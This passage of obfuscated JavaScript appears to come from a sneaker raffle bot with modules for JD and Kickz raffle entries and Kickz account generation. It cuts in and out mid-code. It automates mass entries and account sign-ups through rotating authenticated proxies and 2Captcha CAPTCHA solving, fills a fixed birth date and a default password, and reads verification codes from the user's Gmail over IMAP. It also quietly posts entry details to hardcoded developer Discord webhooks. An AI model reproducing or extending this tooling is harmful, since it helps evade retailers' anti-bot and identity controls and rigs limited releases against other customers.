                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x258efe['name'] + ']\x20Task\x20' + (_0x516106 + 0x1) + '\x20:\x20Retrying\x20(' + _0x374fa2 + '\x20/\x205)')), _0x516106 = _0x516106 - 0x1, _0x374fa2 = _0x374fa2 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x15bf3f['footshopDelay'] + '\x20ms'), await _0x37731a(_0x15bf3f['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x51b4ec, _0x41ea19, _0x1ea956) {
                var _0x255a28 = ![], _0x436a4e = ![];
                if (_0x15bf3f['captchaKey'] == '' || _0x15bf3f['captchaKey'] == undefined)
                    return console['log'](_0x7ff36['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x15bf3f['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x320202 = 0x0; _0x320202 < _0x41ea19['length']; _0x320202++) {
                    if (_0x54ed37 != 'yes')
                        var _0x54ed37 = '', _0x177114 = 0x0;
                    var _0x2c2eb1, _0x4b980d = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x41ea19[_0x320202]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x41ea19[_0x320202]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x6362be
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x15bf3f['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2bd99c
                            }
                        ]
                    }];
                    const _0x164e57 = { 'embeds': _0x4b980d };
                    _0x57fa03(_0x51b4ec['name'] + '\x20Task\x20' + (_0x320202 + 0x1) + '\x20/\x20' + _0x41ea19['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                    try {
                        await _0x412246(_0x41ea19, _0x320202);
                    } catch {
                        _0x54ed37 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x25238e = await _0x5c5001(_0x41ea19[_0x320202], _0x51b4ec, 'dev', ![]), _0x3d94c7 = await _0x5c5001(_0x41ea19[_0x320202], _0x51b4ec, 'pub', ![]);
                    const _0x5ce6b3 = {
                        'succesDEVMSG': { 'embeds': [_0x25238e] },
                        'succesPUBMSG': { 'embeds': [_0x3d94c7] }
                    };
                    if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                        try {
                            await _0x4160b0(_0x15bf3f['webhook'], _0x5ce6b3['succesDEVMSG']);
                        } catch {
                        }
                    await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x5ce6b3['succesDEVMSG']), await _0x37731a(0xc8);
                    try {
                        await _0x4160b0(_0xd6338c, _0x5ce6b3['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x41ea19[_0x320202]['Email'] == '' || _0x41ea19[_0x320202]['Url'] == '' || _0x41ea19[_0x320202]['FirstName'] == '' || _0x41ea19[_0x320202]['LastName'] == '') {
                        console['log'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x15bf3f['useRandomProxy'] = ![])
                        var _0x40059b = _0x1ea956[_0x320202]['split'](':');
                    else
                        var _0x18d5cd = Math['round'](Math['random']() * (_0x1ea956['length'] - 0x1)), _0x40059b = _0x1ea956[_0x18d5cd]['split'](':');
                    const _0x476f75 = await _0x3df2da['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x40059b[0x0] + ':' + _0x40059b[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x40776d = await _0x476f75['newPage']();
                        await _0x40776d['authenticate']({
                            'username': '' + _0x40059b[0x2],
                            'password': '' + _0x40059b[0x3]
                        }), console['log'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x40776d['setRequestInterception'](!![]), _0x40776d['on']('request', _0xbb99b6 => {
                            _0xbb99b6['resourceType']() === 'image' || _0xbb99b6['resourceType']() === 'font' || _0xbb99b6['resourceType']() === 'media' ? _0xbb99b6['abort']() : _0xbb99b6['continue']();
                        });
                        try {
                            await _0x40776d['goto']('' + _0x41ea19[_0x320202]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x40776d['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x40776d['type']('#comp_firstname', '' + _0x41ea19[_0x320202]['FirstName']), await _0x40776d['waitForSelector']('#comp_lastname'), await _0x40776d['type']('#comp_lastname', '' + _0x41ea19[_0x320202]['LastName']), await _0x40776d['waitForSelector']('#comp_email'), await _0x40776d['type']('#comp_email', '' + _0x41ea19[_0x320202]['Email']), await _0x40776d['waitForSelector']('#comp_paypalemail'), await _0x40776d['type']('#comp_paypalemail', '' + _0x41ea19[_0x320202]['Email']), await _0x40776d['waitForSelector']('#comp_mobile_end'), await _0x40776d['type']('#comp_mobile_end', '' + _0x41ea19[_0x320202]['Phone']), await _0x40776d['waitForSelector']('#comp_dob'), await _0x40776d['type']('#comp_dob', '08/09/1992'), console['log'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x41ea19[_0x320202]['Size'] == 'RANDOM') {
                            const _0x3901c5 = await _0x40776d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x274160 => {
                                return _0x274160['map'](_0x3a9260 => _0x3a9260['value']);
                            });
                            var _0x5398f9 = Math['round'](Math['random']() * (_0x3901c5['length'] - 0x2));
                            await _0x40776d['select']('#shoesize', _0x3901c5[_0x5398f9 + 0x1]), await _0x37731a(0x3e8);
                        } else {
                            const _0x15209e = await _0x40776d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2eb765 => {
                                return _0x2eb765['map'](_0x548b3e => _0x548b3e['innerText']);
                            }), _0x134c35 = await _0x40776d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x36c8a9 => {
                                return _0x36c8a9['map'](_0x41acbe => _0x41acbe['value']);
                            });
                            var _0x3e79b0 = _0x41ea19[_0x320202]['Size'];
                            for (var _0x57c5f4 = 0x1; _0x57c5f4 < _0x134c35['length']; _0x57c5f4++) {
                                var _0x4f7427 = _0x15209e[_0x57c5f4]['split']('\x20')[0x0];
                                if (_0x4f7427 == _0x3e79b0) {
                                    await _0x40776d['select']('#shoesize', _0x134c35[_0x57c5f4]);
                                    break;
                                } else {
                                    if (_0x57c5f4 + 0x1 == _0x134c35['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x40776d['waitForSelector']('#comp_address1'), await _0x40776d['type']('#comp_address1', _0x41ea19[_0x320202]['Address1'] + '\x20' + _0x41ea19[_0x320202]['HouseNumber']), await _0x40776d['waitForSelector']('#comp_address2'), await _0x40776d['type']('#comp_address2', '' + _0x41ea19[_0x320202]['Address2']), await _0x40776d['waitForSelector']('#comp_address2'), await _0x40776d['type']('#comp_address3', '' + _0x41ea19[_0x320202]['City']), await _0x40776d['waitForSelector']('#comp_postcode'), await _0x40776d['type']('#comp_postcode', '' + _0x41ea19[_0x320202]['Zip']), console['log'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x37731a(0x4b0), await _0x40776d['click']('label#emailhold'), await _0x37731a(0x5dc), await _0x40776d['click']('#preauth_tandc_email\x20>\x20label'), await _0x37731a(0x5dc), await _0x40776d['click']('#submit');
                        try {
                            await _0x40776d['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20' + _0x7ff36['blue']('Awaiting\x20Paypal\x20Payment')), _0x476f75['on']('targetcreated', async _0x475f67 => {
                            if (_0x475f67['type']() === 'page') {
                                const _0x224d50 = await _0x475f67['page']();
                                async function _0x424db5() {
                                    try {
                                        await _0x40776d['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x436a4e = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x4f706a() {
                                    try {
                                        await _0x40776d['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x255a28 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x4f706a(), _0x424db5(), await _0x37731a(0x493e0);
                            }
                        });
                        async function _0x275e21() {
                            for (let _0x2970a6 = 0x0; _0x2970a6 < 0x12c; _0x2970a6++) {
                                if (_0x255a28 == !![]) {
                                    _0x54ed37 = 'no', _0x5879e0(_0x41ea19[_0x320202], _0x51b4ec), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                                        try {
                                            await _0x4160b0(_0x15bf3f['webhook'], _0x5ce6b3['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x5ce6b3['succesDEVMSG']), await _0x37731a(0xc8);
                                    try {
                                        await _0x4160b0(_0xd6338c, _0x5ce6b3['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x436a4e)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x37731a(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x37731a(0xbb8), await _0x40776d['click']('.zoid-outlet'), await _0x37731a(0x7d0), await _0x275e21();
                    } catch (_0x11a4c6) {
                        console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20' + _0x11a4c6)), _0x2c2eb1 = '' + _0x11a4c6;
                        var _0x5aa3e9 = await _0x5c5001(_0x41ea19[_0x320202], _0x51b4ec, 'dev', !![], _0x2c2eb1);
                        _0x5ce6b3['errorDEV'] = { 'embeds': [_0x5aa3e9] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x5ce6b3['errorDEV']), await _0x4160b0(_0x3ce78e, _0x5ce6b3['errorDEV']);
                    } finally {
                        _0x476f75 && _0x476f75['close']();
                        if (_0x54ed37 == 'yes' && _0x177114 != 0x5 && _0x2c2eb1 != 'Size\x20Not\x20Found') {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x51b4ec['name'] + ']\x20Task\x20' + (_0x320202 + 0x1) + '\x20:\x20Retrying\x20(' + _0x177114 + '\x20/\x205)')), _0x320202 = _0x320202 - 0x1, _0x177114 = _0x177114 + 0x1;
                            continue;
                        }
                        _0x54ed37 == 'yes' && _0x177114 >= 0x5 && (_0x17fcb0(afew[_0x320202], _0x51b4ec), _0x54ed37 = 'no', _0x177114 = 0x0), console['log']('Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x3822ba, _0x58a5f8, _0x41f7d2) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x70dcb = 0x0; _0x70dcb < _0x58a5f8['length']; _0x70dcb++) {
                        const _0x1ce205 = 'https://www.kickz.com/login';
                        if (_0x3ee0dc != 'yes')
                            var _0x3ee0dc = '', _0xb93fc0 = 0x0;
                        _0x57fa03(_0x3822ba['name'] + '\x20Task\x20' + (_0x70dcb + 0x1) + '\x20/\x20' + _0x58a5f8['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        try {
                            await _0x412246(_0x58a5f8, _0x70dcb);
                        } catch {
                            _0x3ee0dc = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xc974ff = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x6362be
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x15bf3f['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bd99c
                                }
                            ]
                        }];
                        const _0x3c52b8 = { 'embeds': _0xc974ff };
                        var _0x4f58c6 = await _0x5c5001(_0x58a5f8[_0x70dcb], _0x3822ba, 'acc', ![]);
                        const _0x8542e3 = { 'succesDEVMSG': { 'embeds': [_0x4f58c6] } };
                        if (_0x58a5f8[_0x70dcb]['Email'] == '' || _0x58a5f8[_0x70dcb]['FirstName'] == '' || _0x58a5f8[_0x70dcb]['LastName'] == '') {
                            console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x58a5f8[_0x70dcb]['Password'] == '' && (_0x58a5f8[_0x70dcb]['Password'] = 'JRaffles23!');
                        if (_0x15bf3f['useRandomProxy'] = ![])
                            var _0x5004b9 = _0x41f7d2[_0x70dcb]['split'](':');
                        else
                            var _0x406c40 = Math['round'](Math['random']() * (_0x41f7d2['length'] - 0x1)), _0x5004b9 = _0x41f7d2[_0x406c40]['split'](':');
                        const _0x323e66 = await _0x3df2da['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5004b9[0x0] + ':' + _0x5004b9[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x33d02a = await _0x323e66['newPage']();
                            await _0x33d02a['authenticate']({
                                'username': '' + _0x5004b9[0x2],
                                'password': '' + _0x5004b9[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33d02a['setRequestInterception'](!![]), _0x33d02a['on']('request', _0x35c298 => {
                                _0x35c298['resourceType']() === 'image' || _0x35c298['resourceType']() === 'font' || _0x35c298['resourceType']() === 'media' ? _0x35c298['abort']() : _0x35c298['continue']();
                            }), await _0x33d02a['goto'](_0x1ce205), await _0x37731a(0xbb8), console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x33d02a['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x33d02a['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x33d02a['waitForSelector']('#button-register'), await _0x37731a(0x7d0), await _0x33d02a['evaluate'](() => {
                                const _0x32a507 = document['querySelector']('#button-register');
                                _0x32a507['click']();
                            }), console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x37731a(0x1388), await _0x33d02a['waitForSelector']('#customer_salutation'), await _0x33d02a['select']('#customer_salutation', 'mr'), await _0x37731a(0x7d0), await _0x33d02a['waitForSelector']('#customer_firstname'), await _0x33d02a['type']('#customer_firstname', '' + _0x58a5f8[_0x70dcb]['FirstName']), await _0x37731a(0x352), await _0x33d02a['waitForSelector']('#customer_lastname'), await _0x33d02a['type']('#customer_lastname', '' + _0x58a5f8[_0x70dcb]['LastName']), await _0x37731a(0x352), await _0x33d02a['type']('#email-input', '' + _0x58a5f8[_0x70dcb]['Email']), await _0x37731a(0x352), await _0x33d02a['type']('#email-confirm-input', '' + _0x58a5f8[_0x70dcb]['Email']), await _0x37731a(0x352), await _0x33d02a['type']('#register-password', '' + _0x58a5f8[_0x70dcb]['Password']), await _0x37731a(0x352), await _0x33d02a['type']('#password-confirm', '' + _0x58a5f8[_0x70dcb]['Password']), await _0x37731a(0x352), console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x33d02a['click']('#consent'), await _0x37731a(0x1f4);
                            const _0x3f2306 = await _0x33d02a['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x3f2306) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x33d02a['click']('#buttonRegister');
                            try {
                                await _0x33d02a['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x58a5f8[_0x70dcb]['Email']), await _0x37731a(0x4b0);
                            async function _0x2a2b2a() {
                                var _0x1d3cb0, _0x158ef6 = ![];
                                for (var _0x5bb531 = 0x0; _0x5bb531 < 0x18; _0x5bb531++) {
                                    async function _0x745039() {
                                        var _0x7940d = new _0x3451ed({
                                            'user': _0x15bf3f['masterMail'],
                                            'password': _0x15bf3f['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x99b719(_0x5654a3) {
                                            _0x7940d['openBox']('INBOX', ![], _0x5654a3);
                                        }
                                        _0x7940d['once']('ready', function () {
                                            console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x99b719(function (_0xaf50fa, _0xbe038f) {
                                                console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xaf50fa)
                                                    throw _0xaf50fa;
                                                _0x7940d['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x5e74d1, _0x378f1a) {
                                                    if (!_0x378f1a || !_0x378f1a['length'])
                                                        console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x7940d['end']();
                                                    else {
                                                        var _0x15e831 = _0x7940d['seq']['fetch'](_0x378f1a, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x15e831['on']('message', function (_0x3b21a4, _0x3c9144) {
                                                            var _0x783939 = '(#' + _0x3c9144 + ')\x20';
                                                            _0x3b21a4['on']('body', function (_0x25d758, _0x1c824a) {
                                                                _0x34a37a(_0x25d758, (_0x1c330b, _0x1649ab) => {
                                                                    if (_0x1649ab['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x22573b = _0x1649ab['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x1b68e2 = _0x22573b[0x1]['split']('<')[0x0];
                                                                        _0x1d3cb0 = _0x1b68e2;
                                                                    }
                                                                });
                                                            }), _0x3b21a4['once']('end', function () {
                                                            });
                                                        }), _0x15e831['once']('error', function (_0x288e38) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x15e831['once']('end', function () {
                                                            _0x7940d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x7940d['once']('error', function (_0x1fa7de) {
                                            console['log'](_0x7ff36['red'](_0x1fa7de['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x158ef6 = !![];
                                        }), _0x7940d['once']('end', async function () {
                                        }), _0x7940d['connect']();
                                    }
                                    _0x745039(), await _0x37731a(0x1388);
                                    if (_0x1d3cb0)
                                        return _0x1d3cb0;
                                    if (_0x158ef6)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5bb531 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2a2b2a(), _0x37731a(0x320), console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Verifying..'), await _0x33d02a['type']('#verificationCode', code), await _0x37731a(0x1f4), await _0x33d02a['click']('#buttonVerify'), await _0x37731a(0x190), await _0x33d02a['click']('#buttonVerify'), await _0x37731a(0x3e8);
                            try {
                                await _0x33d02a['waitForSelector']('div.b-user_greeting'), _0x3ee0dc = 'no', console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Account\x20' + _0x58a5f8[_0x70dcb]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x241ca2['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x58a5f8[_0x70dcb]['Email'] + ',' + _0x58a5f8[_0x70dcb]['Password'] + ','), console['log'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Account\x20' + _0x58a5f8[_0x70dcb]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x8542e3['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4160b0(_0x14c79a, _0x8542e3['succesDEVMSG']);
                            } catch {
                                _0x3ee0dc = 'no', console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x5a65c5) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20' + _0x5a65c5)), _0xc974ff[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0xc974ff[0x0]['description'] = '' + _0x5a65c5, await _0x4160b0(_0x3ce78e, _0x3c52b8), _0x3ee0dc = 'yes';
                        } finally {
                            _0x323e66 && _0x323e66['close']();
                            if (_0x3ee0dc == 'yes' && _0xb93fc0 != 0x5) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x3822ba['name'] + ']\x20Task\x20' + (_0x70dcb + 0x1) + '\x20:\x20Retrying\x20(' + _0xb93fc0 + '\x20/\x205)')), _0x70dcb = _0x70dcb - 0x1, _0xb93fc0 = _0xb93fc0 + 0x1;
                                continue;
                            }
                            _0x3ee0dc == 'yes' && _0xb93fc0 >= 0x5 && (_0x17fcb0(_0x58a5f8[_0x70dcb], _0x3822ba), _0x3ee0dc = 'no', _0xb93fc0 = 0x0), console['log']('Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x43b12a, _0x30b11a, _0x38183c) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4c40ca = 0x0; _0x4c40ca < _0x30b11a['length']; _0x4c40ca++) {
                        var _0x396336;
                        if (_0x53bc57 != 'yes')
                            var _0x53bc57 = '', _0x1f688f = 0x0;
                        _0x57fa03(_0x43b12a['name'] + '\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20/\x20' + _0x30b11a['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        var _0x4ea03b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x6362be
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x30b11a[_0x4c40ca]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x30b11a[_0x4c40ca]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x15bf3f['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bd99c
                                }
                            ]
                        }], _0x269be0 = await _0x5c5001(_0x30b11a[_0x4c40ca], _0x43b12a, 'dev', ![]), _0xe28980 = await _0x5c5001(_0x30b11a[_0x4c40ca], _0x43b12a, 'pub', ![]);
                        const _0x38bcb6 = {
                            'succesDEVMSG': { 'embeds': [_0x269be0] },
                            'succesPUBMSG': { 'embeds': [_0xe28980] }
                        };
                        try {
                            await _0x412246(_0x30b11a, _0x4c40ca);
                        } catch {
                            _0x53bc57 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x30b11a[_0x4c40ca]['Email'] == '' || _0x30b11a[_0x4c40ca]['Password'] == '' || _0x30b11a[_0x4c40ca]['FirstName'] == '' || _0x30b11a[_0x4c40ca]['LastName'] == '') {
                            console['log'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x15bf3f['useRandomProxy'] = ![])
                            var _0x297079 = _0x38183c[_0x4c40ca]['split'](':');
                        else
                            var _0x37a5db = Math['round'](Math['random']() * (_0x38183c['length'] - 0x1)), _0x297079 = _0x38183c[_0x37a5db]['split'](':');
                        const _0x3cde6b = await _0x3df2da['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x297079[0x0] + ':' + _0x297079[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1aa0e8 = await _0x3cde6b['newPage']();
                            await _0x1aa0e8['authenticate']({
                                'username': '' + _0x297079[0x2],
                                'password': '' + _0x297079[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x43b12a['name'] + ']\x20Task\x20' + (_0x4c40ca + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1aa0e8['setRequestInterception'](!![]), _0x1aa0e8['on']('request', _0x325b67 => {
                                _0x325b67['resourceType']() === 'image' || _0x325b67['resourceType']() === 'font' || _0x325b67['resourceType']() === 'media' ? _0x325b67['abort']() : _0x325b67['continue']();
                            }), await _0x1aa0e8['goto']('' + _0x30b11a[_0x4c40ca]['Url'], { 'waitUntil': 'networkidle2' }), await _0x37731a(0x12c);
                            try {
